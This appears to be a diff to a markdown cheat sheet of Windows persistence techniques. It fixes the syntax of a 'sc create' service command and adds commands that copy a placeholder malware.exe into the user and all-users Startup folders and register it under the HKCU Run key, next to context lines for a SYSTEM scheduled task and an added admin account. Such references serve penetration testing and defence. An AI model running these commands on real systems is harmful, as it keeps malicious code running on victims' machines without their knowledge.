@@ -219,8 +219,8 @@ Add-LocalGroupMember "Administrators" -Member "mr.malicious"
 Create a Windows service
 
 ```cmd
-# runs after startup
-sc create "BadService" binpath= "C:\malware.exe" start=auto
+# runs after OS startup
+sc create "BadService" binpath= "C:\malware.exe" start= auto
 ```
 
 Create a scheduled task
@@ -228,4 +228,20 @@ Create a scheduled task
 ```cmd
 # runs after startup
 schtasks /create /tn "BadTask" /tr "C:\malware.exe" /sc onstart /ru System
+```
+
+Add malware to startup menu
+
+```cmd
+# user startup
+copy C:\malware.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"
+
+# all users
+copy C:\malware.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"
+```
+
+Add malware to "Run" keys (user login)
+
+```cmd
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v BadKey /t REG_SZ /d "C:\malware.exe"
 ```
